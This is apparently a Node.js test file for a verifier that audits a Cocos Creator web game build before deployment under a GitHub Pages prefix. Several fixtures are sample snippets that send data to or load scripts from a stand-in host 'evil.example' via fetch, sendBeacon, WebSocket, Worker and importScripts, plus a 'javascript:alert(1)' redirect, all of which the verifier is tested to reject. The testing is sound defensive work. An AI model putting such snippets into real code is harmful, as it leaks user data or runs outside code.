import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { request } from 'node:http';
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import test, { after } from 'node:test';

import {
  createPagesPrefixServer,
  PAGES_PREFIX,
  pagesUrlForPath,
  verifyWebMobileBuild,
} from '../scripts/verify-web-mobile-build.mjs';
import { inspectWebBuildDirectory } from '../scripts/audit-web-build.mjs';

const testRoot = mkdtempSync(join(tmpdir(), 'pencil-blade-web-verifier-'));
const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const verifierScript = join(projectRoot, 'scripts/verify-web-mobile-build.mjs');
let fixtureIndex = 0;

after(() => {
  rmSync(testRoot, { force: true, recursive: true });
});

test('verifier serves every eager and statically discoverable lazy asset at the exact Pages prefix', async () => {
  const buildRoot = createValidBuild();
  const result = await verifyWebMobileBuild(buildRoot);
  const discovered = new Set(result.discoveredReferences.map((item) => item.path));

  assert.equal(result.prefix, '/pencil-blade-2026/');
  assert.equal(PAGES_PREFIX, '/pencil-blade-2026/');
  assert.equal(result.checkedFiles, 16);
  assert.deepEqual(result.offOriginRequests, []);
  assert.ok(discovered.has('style.css'));
  assert.ok(discovered.has('index.js'));
  assert.ok(discovered.has('application.js'));
  assert.ok(discovered.has('src/lazy.js'));
  assert.ok(discovered.has('src/settings.json'));
  assert.ok(discovered.has('src/chunks/bundle.js'));
  assert.ok(discovered.has('cocos-js/cc.js'));
  assert.ok(discovered.has('cocos-js/meshopt_decoder.wasm-wrapper.js'));
  assert.ok(discovered.has('cocos-js/assets/meshopt_decoder.wasm.wasm'));
  assert.ok(discovered.has('assets/game/fonts/linds.woff2'));
  assert.ok(discovered.has('assets/game/native/loading screen.png'));
  assert.ok(discovered.has('assets/game/audio/cut.ogg'));
  assert.ok(result.requests.some((entry) => entry.path === '/'));
  assert.ok(result.requests.some((entry) => entry.path === '/pencil-blade-2026'));
  assert.ok(result.requests.some((entry) => entry.path === '/other-project/index.html'));
  assert.ok(result.requests.some((entry) => entry.path === '/pencil-blade-2026/%2e%2e/index.html'));
  assert.ok(result.requests.every((entry) => (
    entry.path === '/'
    || entry.path === '/pencil-blade-2026'
    || entry.path === '/other-project/index.html'
    || entry.path.startsWith(PAGES_PREFIX)
  )));
});

test('Pages URL generation percent-encodes each build path segment under the fixed prefix', () => {
  assert.equal(
    pagesUrlForPath('assets/game/loading screen.png'),
    '/pencil-blade-2026/assets/game/loading%20screen.png',
  );
});

test('missing eager assets fail the status check', async () => {
  const buildRoot = createValidBuild();
  rmSync(join(buildRoot, 'style.css'));

  await assert.rejects(
    verifyWebMobileBuild(buildRoot),
    /style\.css returned HTTP 404/u,
  );
});

test('missing JavaScript lazy imports fail the status check', async () => {
  const buildRoot = createValidBuild();
  rmSync(join(buildRoot, 'src/lazy.js'));

  await assert.rejects(
    verifyWebMobileBuild(buildRoot),
    /src\/lazy\.js returned HTTP 404/u,
  );
});

test('missing Creator System.register engine dependencies fail the status check', async () => {
  const buildRoot = createValidBuild();
  rmSync(join(buildRoot, 'cocos-js/meshopt_decoder.wasm-wrapper.js'));

  await assert.rejects(
    verifyWebMobileBuild(buildRoot),
    /cocos-js\/meshopt_decoder\.wasm-wrapper\.js returned HTTP 404/u,
  );
});

test('missing Creator Box2D JavaScript payload fails the audit gate', async () => {
  const buildRoot = createValidBuild();
  rmSync(join(buildRoot, 'src/chunks/bundle.js'));

  await assert.rejects(
    verifyWebMobileBuild(buildRoot),
    /required Creator Box2D JavaScript payload is missing/u,
  );
});

test('missing fetch, JSON-manifest, font, media, image, and WebAssembly URLs fail closed', async (t) => {
  const cases = [
    ['assets/game/audio/cut.ogg', /assets\/game\/audio\/cut\.ogg returned HTTP 404/u],
    ['assets/game/fonts/linds.woff2', /assets\/game\/fonts\/linds\.woff2 returned HTTP 404/u],
    ['assets/game/native/loading screen.png', /assets\/game\/native\/loading screen\.png returned HTTP 404/u],
    ['cocos-js/assets/meshopt_decoder.wasm.wasm', /meshopt_decoder\.wasm\.wasm returned HTTP 404/u],
  ];
  for (const [relativePath, pattern] of cases) {
    await t.test(relativePath, async () => {
      const buildRoot = createValidBuild();
      rmSync(join(buildRoot, relativePath));
      await assert.rejects(verifyWebMobileBuild(buildRoot), pattern);
    });
  }
});

test('off-origin, root-relative, and escaping URLs are rejected before any external request', async (t) => {
  const cases = [
    [
      'fetch("http://127.0.0.1:9/must-not-request.png");',
      /off-origin URL is prohibited/u,
    ],
    [
      'fetch("/assets/root.png");',
      /root-relative URL bypasses the Pages prefix/u,
    ],
    [
      'import("../../outside.js");',
      /URL escapes the web build root/u,
    ],
    [
      'new WebSocket("wss://socket.example.invalid/game");',
      /off-origin URL is prohibited/u,
    ],
    [
      'navigator.sendBeacon("https://telemetry.example.invalid/collect");',
      /off-origin URL is prohibited/u,
    ],
    [
      'location.assign("https://redirect.example.invalid/");',
      /off-origin URL is prohibited/u,
    ],
  ];
  for (const [source, pattern] of cases) {
    await t.test(source, async () => {
      const buildRoot = createValidBuild();
      writeBuildFile(buildRoot, 'src/unsafe.js', source);
      await assert.rejects(verifyWebMobileBuild(buildRoot), pattern);
    });
  }
});

test('indirect off-origin endpoints are rejected across every supported sink family', async (t) => {
  const cases = [
    [
      'reviewer alias reproduction',
      'const endpoint = "https://evil.example/collect"; fetch(endpoint);',
      /https:\/\/evil\.example\/collect/u,
    ],
    [
      'semicolonless alias',
      'const endpoint = "https://evil.example/asi"\nfetch(endpoint)',
      /https:\/\/evil\.example\/asi/u,
    ],
    [
      'for-head lexical shadow',
      'const endpoint = "https://evil.example/outer"; for (const endpoint of []) {} fetch(endpoint);',
      /https:\/\/evil\.example\/outer/u,
    ],
    [
      'unbraced for-head lexical shadow',
      'const endpoint = "https://evil.example/unbraced"; for (const endpoint of []) void endpoint\nfetch(endpoint)',
      /https:\/\/evil\.example\/unbraced/u,
    ],
    [
      'alias chain and Request',
      'const base = "https://evil.example"; const endpoint = base + "/request"; const alias = endpoint; new Request(alias);',
      /https:\/\/evil\.example\/request/u,
    ],
    [
      'object property and XHR',
      'const routes = { collect: "https://evil.example/xhr" }; const xhr = new XMLHttpRequest(); xhr.open("POST", routes.collect);',
      /https:\/\/evil\.example\/xhr/u,
    ],
    [
      'template and WebSocket',
      'const host = "socket.example"; const routes = { socket: `wss://${host}/game` }; new WebSocket(routes.socket);',
      /wss:\/\/socket\.example\/game/u,
    ],
    [
      'EventSource',
      'const endpoint = "https://" + "evil.example/events"; new EventSource(endpoint);',
      /https:\/\/evil\.example\/events/u,
    ],
    [
      'sendBeacon',
      'const endpoint = "https://evil.example/beacon"; navigator.sendBeacon(endpoint);',
      /https:\/\/evil\.example\/beacon/u,
    ],
    [
      'Worker',
      'const routes = { worker: "//evil.example/worker.js" }; new Worker(routes.worker);',
      /\/\/evil\.example\/worker\.js/u,
    ],
    [
      'SharedWorker',
      'const endpoint = "https://evil.example/shared-worker.js"; new SharedWorker(endpoint);',
      /https:\/\/evil\.example\/shared-worker\.js/u,
    ],
    [
      'importScripts',
      'const endpoint = "https://evil.example/imported.js"; importScripts(endpoint);',
      /https:\/\/evil\.example\/imported\.js/u,
    ],
    [
      'dynamic import',
      'const endpoint = "https://evil.example/module.js"; import(endpoint);',
      /https:\/\/evil\.example\/module\.js/u,
    ],
    [
      'location call',
      'const routes = { redirect: "https://evil.example/redirect" }; location.assign(routes.redirect);',
      /https:\/\/evil\.example\/redirect/u,
    ],
    [
      'location assignment',
      'const endpoint = "javascript:alert(1)"; window.location.href = endpoint;',
      /javascript:alert\(1\)/u,
    ],
  ];
  for (const [label, source, pattern] of cases) {
    await t.test(label, async () => {
      const buildRoot = createValidBuild();
      writeBuildFile(buildRoot, 'src/unsafe.js', source);
      await assert.rejects(verifyWebMobileBuild(buildRoot), pattern);
    });
  }
});

test('indirect relative sink values stay under the Pages prefix with zero off-origin requests', async () => {
  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'aliases.js',
    [
      'const documentation = "https://docs.example.invalid/networking";',
      'const prefix = "./assets/game";',
      'const paths = { audio: `${prefix}/audio/` + "cut.ogg", worker: "./src/lazy.js" };',
      'const endpoint = paths.audio;',
      'for (const documentation = paths.audio; false;)',
      '  if (false) void 0; else fetch(documentation);',
      'fetch(endpoint);',
      'new Request(endpoint);',
      'const xhr = new XMLHttpRequest();',
      'xhr.open("GET", endpoint);',
      'new WebSocket(endpoint);',
      'new EventSource(endpoint);',
      'navigator.sendBeacon(endpoint);',
      'new Worker(paths.worker);',
      'new SharedWorker(paths.worker);',
      'importScripts(paths.worker);',
      'import(paths.worker);',
      'location.assign("./index.html");',
      'window.open("./index.html");',
      'void documentation;',
    ].join('\n'),
  );

  const result = await verifyWebMobileBuild(buildRoot);
  const discovered = new Set(result.discoveredReferences.map((item) => item.path));
  assert.ok(discovered.has('assets/game/audio/cut.ogg'));
  assert.ok(discovered.has('src/lazy.js'));
  assert.ok(discovered.has('index.html'));
  assert.deepEqual(result.offOriginRequests, []);
});

test('unsupported file types fail before the MIME/status pass', async () => {
  const buildRoot = createValidBuild();
  writeBuildFile(buildRoot, 'assets/game/unsafe.php', '<?php');

  await assert.rejects(
    verifyWebMobileBuild(buildRoot),
    /unsupported static file type/u,
  );
});

test('prefix server rejects same-size changes to files after audit', async () => {
  const buildRoot = createValidBuild();
  const audit = inspectWebBuildDirectory(buildRoot);
  assert.deepEqual(audit.findings, []);
  const server = createPagesPrefixServer(audit);
  await new Promise((resolveListen, rejectListen) => {
    server.once('error', rejectListen);
    server.listen(0, '127.0.0.1', resolveListen);
  });
  try {
    const indexPath = join(buildRoot, 'index.html');
    const original = readFileSync(indexPath);
    writeFileSync(indexPath, Buffer.alloc(original.length, 0x20));
    const address = server.address();
    assert.notEqual(address, null);
    assert.equal(typeof address, 'object');
    const statusCode = await requestStatus(address.port, PAGES_PREFIX);
    assert.equal(statusCode, 404);
  } finally {
    await new Promise((resolveClose, rejectClose) => {
      server.close((error) => error === undefined ? resolveClose() : rejectClose(error));
    });
  }
});

test('verifier CLI is directly usable by the Pages workflow and fails closed', () => {
  const buildRoot = createValidBuild();
  const success = spawnSync(process.execPath, [verifierScript, buildRoot], {
    encoding: 'utf8',
    timeout: 15_000,
  });
  assert.equal(success.status, 0, success.stderr);
  assert.match(
    success.stdout,
    /^PASS: 16 files verified at exact Pages prefix \/pencil-blade-2026\//u,
  );

  rmSync(join(buildRoot, 'src/lazy.js'));
  const failure = spawnSync(process.execPath, [verifierScript, buildRoot], {
    encoding: 'utf8',
    timeout: 15_000,
  });
  assert.equal(failure.status, 1);
  assert.match(failure.stderr, /src\/lazy\.js returned HTTP 404/u);
});

function createValidBuild() {
  fixtureIndex += 1;
  const buildRoot = join(testRoot, `build-${fixtureIndex}`);
  writeBuildFile(
    buildRoot,
    'index.html',
    [
      '<!doctype html>',
      '<!-- https://documentation.example.invalid must not be requested -->',
      '<link rel="stylesheet" href="./style.css">',
      '<canvas id="GameCanvas"></canvas>',
      '<script type="module" src="./index.js"></script>',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'style.css',
    [
      '@font-face { font-family: Linds; src: url("./assets/game/fonts/linds.woff2"); }',
      'body { background: url("./assets/game/native/loading%20screen.png"); }',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'index.js',
    [
      'System.register(["./application.js", "./src/lazy.js"], function () {',
      '  return { setters: [function () {}, function () {}], execute: function () {} };',
      '});',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'application.js',
    [
      'System.register([], function () {',
      '  const settingsPath = "src/settings.json";',
      '  return { setters: [], execute: function () { return settingsPath; } };',
      '});',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'src/lazy.js',
    'fetch("assets/game/audio/cut.ogg");',
  );
  writeBuildFile(
    buildRoot,
    'src/settings.json',
    JSON.stringify({
      assets: {
        lazyAssetUrl: 'assets/game/native/loading%20screen.png',
      },
      debug: false,
      scripting: {
        scriptPackages: ['../src/chunks/bundle.js'],
      },
    }),
  );
  writeBuildFile(
    buildRoot,
    'src/import-map.json',
    JSON.stringify({ imports: { cc: '../cocos-js/cc.js' } }),
  );
  writeBuildFile(
    buildRoot,
    'src/chunks/bundle.js',
    'System.register("chunks:///_virtual/box2d.umd.js", [], function () { const b2World = {}; });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/cc.js',
    'System.register(["./meshopt_decoder.wasm-wrapper.js"], function () { return {}; });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/meshopt_decoder.wasm-wrapper.js',
    'System.register([], function (_export) { _export("default", "assets/meshopt_decoder.wasm.wasm"); });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/assets/meshopt_decoder.wasm.wasm',
    Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]),
  );
  writeBuildFile(buildRoot, 'assets/game/config.json', JSON.stringify({ name: 'game' }));
  writeBuildFile(buildRoot, 'assets/game/index.js', 'export const bundle = "game";');
  writeBuildFile(buildRoot, 'assets/game/fonts/linds.woff2', Buffer.from('wOF2font'));
  writeBuildFile(buildRoot, 'assets/game/native/loading screen.png', Buffer.from('PNGfixture'));
  writeBuildFile(buildRoot, 'assets/game/audio/cut.ogg', Buffer.from('OggSfixture'));
  return buildRoot;
}

function writeBuildFile(buildRoot, relativePath, contents) {
  const absolutePath = join(buildRoot, relativePath);
  mkdirSync(dirname(absolutePath), { recursive: true });
  writeFileSync(absolutePath, contents);
}

function requestStatus(port, path) {
  return new Promise((resolveRequest, rejectRequest) => {
    const outgoing = request({
      agent: false,
      host: '127.0.0.1',
      method: 'HEAD',
      path,
      port,
    }, (incoming) => {
      incoming.resume();
      incoming.on('end', () => resolveRequest(incoming.statusCode ?? 0));
    });
    outgoing.on('error', rejectRequest);
    outgoing.end();
  });
}
